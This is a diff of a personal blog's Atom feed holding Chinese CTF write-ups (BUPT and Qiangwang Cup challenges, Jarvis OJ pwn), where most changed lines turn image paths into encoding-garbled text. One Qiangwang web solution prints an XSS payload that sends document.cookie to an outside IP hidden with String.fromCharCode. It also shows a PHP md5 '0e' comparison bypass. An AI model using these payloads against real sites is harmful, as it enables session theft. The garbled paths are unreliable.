-</code></pre><p>修改调整数组<br><img src="/2018/04/03/北邮网安杯Writeup/20.jpg" alt="测试"><br>右键修改 重新F5得到清晰地代码 和密文</p>
+</code></pre><p>修改调整数组<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/20.jpg" alt="测试"><br>右键修改 重新F5得到清晰地代码 和密文</p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>unsigned int __thiscall sub_401490(CWnd *this)
 {
@@ -3605,13 +3695,13 @@ v6<span class="token punctuation">[</span><span class="token number">23</span><s
 return0<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><img src="/2018/04/03/北邮网安杯Writeup/10.jpg" alt="测试"></p>
-<h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p><img src="/2018/04/03/北邮网安杯Writeup/11.jpg" alt="流程"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/10.jpg" alt="测试"></p>
+<h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/11.jpg" alt="流程"></p>
 <p>简单走流程 猜测应该和RE1思路相似 需要解密某加密</p>
 <p>载入分析</p>
-<p><img src="/2018/04/03/北邮网安杯Writeup/12.jpg" alt="流程1"></p>
-<p><img src="/2018/04/03/北邮网安杯Writeup/13.jpg" alt="流程2"></p>
-<p><img src="/2018/04/03/北邮网安杯Writeup/14.jpg" alt="流程3"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/12.jpg" alt="流程1"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/13.jpg" alt="流程2"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/14.jpg" alt="流程3"></p>
 <p>分析可以得出 加密方式为RC4加密<br>解密流程与加密流程相同<br>可以写的脚本跑出密文并走过第二个函数进行解密</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># /usr/bin/python</span>
@@ -3655,20 +3745,18 @@ str<span class="token operator">=</span><span class="token string">""</span>
 运行即可跑出flag
 <span class="token comment" spellcheck="true">#BUPT{rc4_Cryptography_1sSOEa5y!-_-!!!}</span>
 </code></pre>
-<p><img src="/2018/04/03/北邮网安杯Writeup/15.jpg" alt="流程4"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/15.jpg" alt="流程4"></p>
 <h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>2333太菜了比赛时间内没做出来0.0</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;WEB1-交易中心，你能买到FLAG吗？&quot;&gt;&lt;a href=&quot;#WEB1-交易中心，你能买到FLAG吗？&quot; class=&quot;headerlink&quot; title=&quot;WEB1 交易中心，你能买到FLAG吗？&quot;&gt;&lt;/a&gt;WEB1 交易中心，你能买到FLAG吗？&lt;/h3&gt;&lt;p&gt;提供了源码下载&lt;br&gt;&lt;img src=&quot;/2018/04/03/北邮网安杯Writeup/3.jpg&quot; alt=&quot;源码&quot;&gt;&lt;/p&gt;
+      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;WEB1-交易中心，你能买到FLAG吗？&quot;&gt;&lt;a href=&quot;#WEB1-交易中心，你能买到FLAG吗？&quot; class=&quot;headerlink&quot; title=&quot;WEB1 交易中心，你能买到FLAG吗？&quot;&gt;&lt;/a&gt;WEB1 交易中心，你能买到FLAG吗？&lt;/h3&gt;&lt;p&gt;提供了源码下载&lt;br&gt;&lt;img src=&quot;/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/3.jpg&quot; alt=&quot;源码&quot;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
     
     </summary>
     
-    
-      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
     
       <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
     
@@ -3676,24 +3764,26 @@ str<span class="token operator">=</span><span class="token string">""</span>
     
       <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
     
+      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
+    
   </entry>
   
   <entry>
     <title>第二届强网杯部分Writeup</title>
-    <link href="http://iosmosis.github.io/2018/03/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Writeup/"/>
-    <id>http://iosmosis.github.io/2018/03/24/第二届强网杯部分Writeup/</id>
+    <link href="http://iosmosis.github.io/2018/03/24/%E2%95%A1%E2%94%8C%E2%95%A2%E2%96%A0%E2%95%9C%D1%8C%E2%95%9F%E2%94%90%E2%95%90%C2%B0%E2%96%92%D0%BD%E2%96%93%E2%94%90%E2%95%96%E2%95%93Writeup/"/>
+    <id>http://iosmosis.github.io/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/</id>
     <published>2018-03-24T11:31:37.000Z</published>
-    <updated>2018-04-05T13:41:30.994Z</updated>
+    <updated>2018-04-05T13:41:32.000Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>  Stegsolve–&gt;<br>  <img src="/2018/03/24/第二届强网杯部分Writeup/7.jpg" alt="网站入口"></p>
+    <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>  Stegsolve–&gt;<br>  <img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/7.jpg" alt="网站入口"></p>
 <ul>
 <li><a id="more"></a>
 <p><the rest="" of="" contents="" |="" 余下全文=""><br>偏移得到</the></p>
-<p><img src="/2018/03/24/第二届强网杯部分Writeup/8.jpg" alt="网站入口"></p>
+<p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/8.jpg" alt="网站入口"></p>
 </li>
 </ul>
-<h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h4 id="进入web签到给的地址-http-39-107-33-96-10000"><a href="#进入web签到给的地址-http-39-107-33-96-10000" class="headerlink" title="进入web签到给的地址 http://39.107.33.96:10000/"></a>进入web签到给的地址 <a href="http://39.107.33.96:10000/" target="_blank" rel="external">http://39.107.33.96:10000/</a></h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/1.jpg" alt="网站入口"></p>
-<h4 id="查看下网站源码-发现hint"><a href="#查看下网站源码-发现hint" class="headerlink" title="查看下网站源码 发现hint"></a>查看下网站源码 发现hint</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/2.jpg" alt="网站源码"></p>
+<h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h4 id="进入web签到给的地址-http-39-107-33-96-10000"><a href="#进入web签到给的地址-http-39-107-33-96-10000" class="headerlink" title="进入web签到给的地址 http://39.107.33.96:10000/"></a>进入web签到给的地址 <a href="http://39.107.33.96:10000/" target="_blank" rel="external">http://39.107.33.96:10000/</a></h4><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/1.jpg" alt="网站入口"></p>
+<h4 id="查看下网站源码-发现hint"><a href="#查看下网站源码-发现hint" class="headerlink" title="查看下网站源码 发现hint"></a>查看下网站源码 发现hint</h4><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/2.jpg" alt="网站源码"></p>
 <h4 id="需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型"><a href="#需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型" class="headerlink" title="需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型"></a>需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型</h4><h3 id="根据了解找到一组值"><a href="#根据了解找到一组值" class="headerlink" title="根据了解找到一组值"></a>根据了解找到一组值</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>240610708,32<span class="token punctuation">)</span> <span class="token operator">=</span> 0e462097431906509019562988736854
 md5<span class="token punctuation">(</span>240610708,16<span class="token punctuation">)</span> <span class="token operator">=</span> 4319065090195629
@@ -3701,13 +3791,13 @@ md5<span class="token punctuation">(</span>240610708,16<span class="token punctu
 md5<span class="token punctuation">(</span>QNKCDZO,32<span class="token punctuation">)</span> <span class="token operator">=</span> 0e830400451993494058024219903391
 md5<span class="token punctuation">(</span>QNKCDZO,16<span class="token punctuation">)</span> <span class="token operator">=</span> 4519934940580242
 </code></pre>
-<h4 id="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过"><a href="#上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过" class="headerlink" title="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!"></a>上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!</h4><h3 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/3.jpg" alt="网站2"></p>
-<h4 id="查看网站源码"><a href="#查看网站源码" class="headerlink" title="查看网站源码"></a>查看网站源码</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/4.jpg" alt="源码2"></p>
-<h3 id="第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成"><a href="#第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成" class="headerlink" title="第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成"></a>第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/9.jpg" alt="源码2"></p>
-<h3 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h3><p>注意到此题环境配置了pathinfo,并且涉及到XSS,所以推测是RPO.<br>当在Write article的内容处写入js代码(不能写标题,因为写入标题后会引入html标签).<br><img src="/2018/03/24/第二届强网杯部分Writeup/10.jpg" alt="源码2"><br>这样就相当于在网站写入了一段纯JS.</p>
-<p><img src="/2018/03/24/第二届强网杯部分Writeup/11.jpg" alt="源码2"></p>
+<h4 id="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过"><a href="#上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过" class="headerlink" title="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!"></a>上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!</h4><h3 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h3><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/3.jpg" alt="网站2"></p>
+<h4 id="查看网站源码"><a href="#查看网站源码" class="headerlink" title="查看网站源码"></a>查看网站源码</h4><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/4.jpg" alt="源码2"></p>
+<h3 id="第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成"><a href="#第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成" class="headerlink" title="第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成"></a>第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成</h3><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/9.jpg" alt="源码2"></p>
+<h3 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h3><p>注意到此题环境配置了pathinfo,并且涉及到XSS,所以推测是RPO.<br>当在Write article的内容处写入js代码(不能写标题,因为写入标题后会引入html标签).<br><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/10.jpg" alt="源码2"><br>这样就相当于在网站写入了一段纯JS.</p>
+<p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/11.jpg" alt="源码2"></p>
 <p>访问<a href="http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO</a>.</p>
-<p><img src="/2018/03/24/第二届强网杯部分Writeup/12.jpg" alt="源码2"></p>
+<p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/12.jpg" alt="源码2"></p>
 <p>然后讲这个地址Export给后台的机器人就行了.<br>所以思路就是利用这个XSS去打COOKIE.<br>后端过滤了引号,利用fromCharCode绕过.<br>PAYLOAD:<br>(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,49,56,53,46,56,57,47) + document.cookie;<br>得到第一个cookie,提示需要进一步打子目录下的COOKIE.</p>
 <p>引入一个iframe就行了,<br>PAYLAOD2:</p>
 <p></p><p class="code-caption" data-lang="javascript" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -3768,7 +3858,7 @@ for i in range(1, 65):
             except Exception as e:
                 # print(&quot;[+]{} 登陆失败.&quot;.format(username))
                 continue
-</code></pre><h3 id="ai-nimals"><a href="#ai-nimals" class="headerlink" title="ai-nimals"></a>ai-nimals</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/13.jpg" alt="源码2"><br>多次发送狗狗图片的base64编码得到</p>
+</code></pre><h3 id="ai-nimals"><a href="#ai-nimals" class="headerlink" title="ai-nimals"></a>ai-nimals</h3><p><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/13.jpg" alt="源码2"><br>多次发送狗狗图片的base64编码得到</p>
 <h3 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h3><p>位数不是很大，爆破即可</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -3837,7 +3927,7 @@ c <span class="token operator">=</span> f<span class="token punctuation">.</span
         <span class="token keyword">print</span> x<span class="token punctuation">,</span>cx<span class="token punctuation">,</span>flag
         Break
 </code></pre>
-<p>即可得到flag<br><img src="/2018/03/24/第二届强网杯部分Writeup/14.jpg" alt="源码2"></p>
+<p>即可得到flag<br><img src="/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/14.jpg" alt="源码2"></p>
 <h3 id="streamgame4"><a href="#streamgame4" class="headerlink" title="streamgame4"></a>streamgame4</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#include &lt;iostream></span>
 <span class="token comment" spellcheck="true">#include &lt;bitset>  </span>
@@ -3949,7 +4039,7 @@ int main<span class="token punctuation">(</span>int argc<span class="token punct
     
     <summary type="html">
     
-      &lt;h2 id=&quot;Welcome&quot;&gt;&lt;a href=&quot;#Welcome&quot; class=&quot;headerlink&quot; title=&quot;Welcome&quot;&gt;&lt;/a&gt;Welcome&lt;/h2&gt;&lt;p&gt;  Stegsolve–&amp;gt;&lt;br&gt;  &lt;img src=&quot;/2018/03/24/第二届强网杯部分Writeup/7.jpg&quot; alt=&quot;网站入口&quot;&gt;&lt;/p&gt;
+      &lt;h2 id=&quot;Welcome&quot;&gt;&lt;a href=&quot;#Welcome&quot; class=&quot;headerlink&quot; title=&quot;Welcome&quot;&gt;&lt;/a&gt;Welcome&lt;/h2&gt;&lt;p&gt;  Stegsolve–&amp;gt;&lt;br&gt;  &lt;img src=&quot;/2018/03/24/╡┌╢■╜ь╟┐═°▒н▓┐╖╓Writeup/第二届强网杯部分Writeup/7.jpg&quot; alt=&quot;网站入口&quot;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
     
@@ -3969,7 +4059,7 @@ int main<span class="token punctuation">(</span>int argc<span class="token punct
     <link href="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/"/>
     <id>http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/</id>
     <published>2018-03-21T07:16:36.000Z</published>
-    <updated>2018-07-06T09:40:59.265Z</updated>
+    <updated>2018-07-06T09:41:00.000Z</updated>
     
     <content type="html"><![CDATA[<p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
 <h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -4523,7 +4613,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/03/21/When-Did-You-Born/"/>
     <id>http://iosmosis.github.io/2018/03/21/When-Did-You-Born/</id>
     <published>2018-03-21T02:49:50.000Z</published>
-    <updated>2018-03-21T03:25:20.219Z</updated>
+    <updated>2018-03-21T03:25:22.000Z</updated>
     
     <content type="html"><![CDATA[<p>南邮CTF的一道简单pwn100题目</p>
 <p><img src="/2018/03/21/When-Did-You-Born/1.jpg" alt="题目信息"></p>
@@ -4657,7 +4747,7 @@ oh<span class="token operator">!</span> you get this flag<span class="token oper
     <link href="http://iosmosis.github.io/2018/03/20/hexofix/"/>
     <id>http://iosmosis.github.io/2018/03/20/hexofix/</id>
     <published>2018-03-20T15:37:28.000Z</published>
-    <updated>2018-03-20T17:05:32.853Z</updated>
+    <updated>2018-03-20T17:05:34.000Z</updated>
     
     <content type="html"><![CDATA[<p>解决了关于hexo文章内部引用图片的问题</p>
 <h4 id="找到你建立的hexo网站的主页配置文件-“-config-yml”"><a href="#找到你建立的hexo网站的主页配置文件-“-config-yml”" class="headerlink" title="找到你建立的hexo网站的主页配置文件 “_config.yml”"></a>找到你建立的hexo网站的主页配置文件 “_config.yml”</h4><p><img src="/2018/03/20/hexofix/2.jpg" alt="主页配置文件"></p>
